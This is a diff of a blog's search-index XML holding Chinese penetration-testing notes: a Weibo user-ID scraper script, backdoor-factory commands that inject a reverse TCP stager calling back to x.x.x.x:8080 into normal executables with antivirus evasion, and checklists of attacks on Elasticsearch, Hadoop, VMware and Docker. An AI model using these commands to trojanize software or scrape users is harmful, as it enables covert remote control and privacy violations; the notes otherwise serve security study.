@@ -108,6 +108,16 @@
       </tags>
   </entry>
   <entry>
+    <title>微博爬取用户oid</title>
+    <url>/2020/03/23/%E5%BE%AE%E5%8D%9A%E7%88%AC%E5%8F%96%E7%94%A8%E6%88%B7oid/</url>
+    <content><![CDATA[<h3 id="微博爬取用户oid脚本"><a href="#微博爬取用户oid脚本" class="headerlink" title="微博爬取用户oid脚本"></a>微博爬取用户oid脚本</h3><a id="more"></a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line">from requests.exceptions import RequestException</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Get_Html_Text(url):</span><br><span class="line">    try:</span><br><span class="line">        headers = &#123;&apos;User-Agent&apos; : &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0&apos;&#125;</span><br><span class="line">        response = requests.get(url, headers=headers)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            return response.text</span><br><span class="line">        return None</span><br><span class="line">    except RequestException:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Re_Html_Oid(html):</span><br><span class="line">    OID = re.findall(r&apos;href=\&quot;https:\/\/weibo.cn\/u\/(.*?)\&quot;&apos;, html)</span><br><span class="line">    return OID</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write_to_file(content):</span><br><span class="line">    with open(&apos;oid_result.txt&apos;, &apos;a&apos;, encoding=&apos;utf-8&apos;) as f:</span><br><span class="line">        f.write(json.dumps(content, ensure_ascii=False) + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(cla,page):</span><br><span class="line">    url = &apos;https://weibo.cn/pub/top?cat=&apos;+ str(cla)+&apos;&amp;page=&apos; + str(page)</span><br><span class="line">    html = Get_Html_Text(url)</span><br><span class="line">    #print (html)</span><br><span class="line">    for oid in Re_Html_Oid(html):</span><br><span class="line">        print(oid)</span><br><span class="line">        write_to_file(oid)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    list1 = [&apos;star&apos;,&apos;grass&apos;,&apos;content&apos;,&apos;media&apos;]</span><br><span class="line">    for j in list1:</span><br><span class="line">        for i in range(1,11):</span><br><span class="line">            main(cla = j,page = i)</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">#运行前先删除oid_result.txt</span><br><span class="line">#start,grass,content,media</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python做身份证合法性验证</title>
     <url>/2020/01/15/Python%E5%81%9A%E8%BA%AB%E4%BB%BD%E8%AF%81%E5%90%88%E6%B3%95%E6%80%A7%E9%AA%8C%E8%AF%81/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现一个好玩的<a href="https://zhuanlan.zhihu.com/p/101334480" target="_blank" rel="noopener">文章</a>， 文章中通过time模块遍历某一年份的所有日期，再根据身份证前6位和后4位以及id_validator模块来筛选出合法的身份证号。以后社工的时候可能用得到。</p><a id="more"></a>
@@ -2197,6 +2207,21 @@
       </tags>
   </entry>
   <entry>
+    <title>shellcode注入工具—backdoor-factory</title>
+    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
+    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>
+
+<p>生成好之后可以对比一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>
+
+<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
+]]></content>
+      <tags>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vssadmin获取NTDS实操</title>
     <url>/2019/09/19/vssadmin%E8%8E%B7%E5%8F%96NTDS%E5%AE%9E%E6%93%8D/</url>
     <content><![CDATA[<p>把昨天发的vssadmin获取ntds数据库的文章实际操作了一下<br>这里使用的是God.org单域环境(更新1)，我的目的只是实操vssadmin所以不搞的太复杂<br><img src="https://i.loli.net/2019/11/11/gKbpe8clSqTjYZ9.png" alt="Image-1.png"></p><a id="more"></a>
@@ -2235,21 +2260,6 @@
 ]]></content>
       <tags>
         <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>shellcode注入工具—backdoor-factory</title>
-    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
-    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>
-
-<p>生成好之后可以对比一下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>
-
-<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
-]]></content>
-      <tags>
-        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -3116,28 +3126,25 @@
       </tags>
   </entry>
   <entry>
-    <title>（六）渗透技巧—大数据</title>
-    <url>/2019/04/15/%EF%BC%88%E5%85%AD%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%A4%A7%E6%95%B0%E6%8D%AE/</url>
+    <title>（五）渗透技巧—云环境</title>
+    <url>/2019/04/15/%EF%BC%88%E4%BA%94%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E4%BA%91%E7%8E%AF%E5%A2%83/</url>
     <content><![CDATA[<blockquote>
 <p>文章不记得从哪个公众号上拉下来的了</p>
 </blockquote><a id="more"></a>
-<h3 id="1、Elsaticsearch"><a href="#1、Elsaticsearch" class="headerlink" title="1、Elsaticsearch"></a>1、Elsaticsearch</h3><p>Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：9200、9300</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   未授权访问；</span><br><span class="line">•   远程命令执行；</span><br><span class="line">•   文件遍历；</span><br><span class="line">•   低版本webshell植入；</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/sectool/38025.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/5401.html</span><br></pre></td></tr></table></figure>
-<h3 id="2、hadoop"><a href="#2、hadoop" class="headerlink" title="2、hadoop"></a>2、hadoop</h3><p>Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。</p>
-<p>Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>
-<p>用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://tech.meituan.com/hadoop-security-practice.html</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/33525241</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/85343</span><br><span class="line"></span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html</span><br></pre></td></tr></table></figure>
-<h3 id="3、Hive"><a href="#3、Hive" class="headerlink" title="3、Hive"></a>3、Hive</h3><p>Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://cwiki.apache.org/confluence/display/Hive/Security</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/yejibigdata/p/6394719.html</span><br></pre></td></tr></table></figure>
-<h3 id="4、Sqoop"><a href="#4、Sqoop" class="headerlink" title="4、Sqoop"></a>4、Sqoop</h3><p>Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。</p>
-<p>用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://sqoop.apache.org/docs/1.99.7/security.html</span><br></pre></td></tr></table></figure>
-<h3 id="5、HBase"><a href="#5、HBase" class="headerlink" title="5、HBase"></a>5、HBase</h3><p>HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。</p>
-<p>它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。</p>
-<p>与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html</span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html</span><br></pre></td></tr></table></figure>
-<h3 id="6、Spark"><a href="#6、Spark" class="headerlink" title="6、Spark"></a>6、Spark</h3><p>Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905</span><br></pre></td></tr></table></figure>
+<h3 id="1、VMware"><a href="#1、VMware" class="headerlink" title="1、VMware"></a>1、VMware</h3><p>使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。<br>一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口（很多）：</span><br><span class="line">https://kb.vmware.com/s/article/2115330</span><br><span class="line">https://kb.vmware.com/s/article/2081930</span><br><span class="line"></span><br><span class="line">漏洞：</span><br><span class="line">•   主机逃逸</span><br><span class="line">•   CVE-2017-5638</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/348/</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/articles/system/141179.html</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/100651.html</span><br><span class="line"></span><br><span class="line">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html</span><br><span class="line"></span><br><span class="line">Tweets by VMwareSRC</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1</span><br><span class="line"></span><br><span class="line">https://www.vmware.com/cn/security/hardening-guides.html</span><br></pre></td></tr></table></figure>
+<h3 id="2、OpenStack"><a href="#2、OpenStack" class="headerlink" title="2、OpenStack"></a>2、OpenStack</h3><p>OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。</span><br><span class="line">•   权限绕过漏洞</span><br><span class="line">•   信息泄露</span><br><span class="line">•   代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/news/topnews/107203.html</span><br></pre></td></tr></table></figure>
+<h3 id="3、Docker"><a href="#3、Docker" class="headerlink" title="3、Docker"></a>3、Docker</h3><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
+<p>Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。</p>
+<p>Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。</p>
+<p>从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）：</span><br><span class="line">•   CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞</span><br><span class="line">•   CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞</span><br><span class="line">•   CVE-2014-9358 1.3.3 Docker 目录遍历漏洞</span><br><span class="line">•   CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞</span><br><span class="line">•   内核漏洞（Kernel exploits）容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。</span><br><span class="line">•   拒绝服务攻击（Denial-of-service attacks）所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。</span><br><span class="line">•   容器突破（Container breakouts）Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。</span><br><span class="line">•   有毒镜像（Poisoned images）主要是考虑到镜像本身的安全性，没太多好说的。</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://toutiao.io/posts/2y9xx8/preview</span><br><span class="line"></span><br><span class="line">http://www.yunweipai.com/archives/21610.html</span><br><span class="line"></span><br><span class="line">http://www.91ri.org/15837.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/ruidu_doer/article/details/53401523</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://dockone.io/article/150</span><br><span class="line"></span><br><span class="line">http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8</span><br><span class="line"></span><br><span class="line">https://blog.waterstrong.me/docker-security/</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
 
 
@@ -3172,25 +3179,28 @@
       </tags>
   </entry>
   <entry>
-    <title>（五）渗透技巧—云环境</title>
-    <url>/2019/04/15/%EF%BC%88%E4%BA%94%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E4%BA%91%E7%8E%AF%E5%A2%83/</url>
+    <title>（六）渗透技巧—大数据</title>
+    <url>/2019/04/15/%EF%BC%88%E5%85%AD%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%A4%A7%E6%95%B0%E6%8D%AE/</url>
     <content><![CDATA[<blockquote>
 <p>文章不记得从哪个公众号上拉下来的了</p>
 </blockquote><a id="more"></a>
-<h3 id="1、VMware"><a href="#1、VMware" class="headerlink" title="1、VMware"></a>1、VMware</h3><p>使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。<br>一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口（很多）：</span><br><span class="line">https://kb.vmware.com/s/article/2115330</span><br><span class="line">https://kb.vmware.com/s/article/2081930</span><br><span class="line"></span><br><span class="line">漏洞：</span><br><span class="line">•   主机逃逸</span><br><span class="line">•   CVE-2017-5638</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/348/</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/articles/system/141179.html</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/100651.html</span><br><span class="line"></span><br><span class="line">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html</span><br><span class="line"></span><br><span class="line">Tweets by VMwareSRC</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1</span><br><span class="line"></span><br><span class="line">https://www.vmware.com/cn/security/hardening-guides.html</span><br></pre></td></tr></table></figure>
-<h3 id="2、OpenStack"><a href="#2、OpenStack" class="headerlink" title="2、OpenStack"></a>2、OpenStack</h3><p>OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。</span><br><span class="line">•   权限绕过漏洞</span><br><span class="line">•   信息泄露</span><br><span class="line">•   代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/news/topnews/107203.html</span><br></pre></td></tr></table></figure>
-<h3 id="3、Docker"><a href="#3、Docker" class="headerlink" title="3、Docker"></a>3、Docker</h3><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
-<p>Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。</p>
-<p>Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。</p>
-<p>从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）：</span><br><span class="line">•   CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞</span><br><span class="line">•   CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞</span><br><span class="line">•   CVE-2014-9358 1.3.3 Docker 目录遍历漏洞</span><br><span class="line">•   CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞</span><br><span class="line">•   内核漏洞（Kernel exploits）容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。</span><br><span class="line">•   拒绝服务攻击（Denial-of-service attacks）所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。</span><br><span class="line">•   容器突破（Container breakouts）Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。</span><br><span class="line">•   有毒镜像（Poisoned images）主要是考虑到镜像本身的安全性，没太多好说的。</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://toutiao.io/posts/2y9xx8/preview</span><br><span class="line"></span><br><span class="line">http://www.yunweipai.com/archives/21610.html</span><br><span class="line"></span><br><span class="line">http://www.91ri.org/15837.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/ruidu_doer/article/details/53401523</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://dockone.io/article/150</span><br><span class="line"></span><br><span class="line">http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8</span><br><span class="line"></span><br><span class="line">https://blog.waterstrong.me/docker-security/</span><br></pre></td></tr></table></figure>
-
-
-
-
-
+<h3 id="1、Elsaticsearch"><a href="#1、Elsaticsearch" class="headerlink" title="1、Elsaticsearch"></a>1、Elsaticsearch</h3><p>Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：9200、9300</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   未授权访问；</span><br><span class="line">•   远程命令执行；</span><br><span class="line">•   文件遍历；</span><br><span class="line">•   低版本webshell植入；</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/sectool/38025.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/5401.html</span><br></pre></td></tr></table></figure>
+<h3 id="2、hadoop"><a href="#2、hadoop" class="headerlink" title="2、hadoop"></a>2、hadoop</h3><p>Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。</p>
+<p>Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>
+<p>用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://tech.meituan.com/hadoop-security-practice.html</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/33525241</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/85343</span><br><span class="line"></span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html</span><br></pre></td></tr></table></figure>
+<h3 id="3、Hive"><a href="#3、Hive" class="headerlink" title="3、Hive"></a>3、Hive</h3><p>Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://cwiki.apache.org/confluence/display/Hive/Security</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/yejibigdata/p/6394719.html</span><br></pre></td></tr></table></figure>
+<h3 id="4、Sqoop"><a href="#4、Sqoop" class="headerlink" title="4、Sqoop"></a>4、Sqoop</h3><p>Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。</p>
+<p>用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://sqoop.apache.org/docs/1.99.7/security.html</span><br></pre></td></tr></table></figure>
+<h3 id="5、HBase"><a href="#5、HBase" class="headerlink" title="5、HBase"></a>5、HBase</h3><p>HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。</p>
+<p>它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。</p>
+<p>与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html</span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html</span><br></pre></td></tr></table></figure>
+<h3 id="6、Spark"><a href="#6、Spark" class="headerlink" title="6、Spark"></a>6、Spark</h3><p>Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905</span><br></pre></td></tr></table></figure>
 
 
 
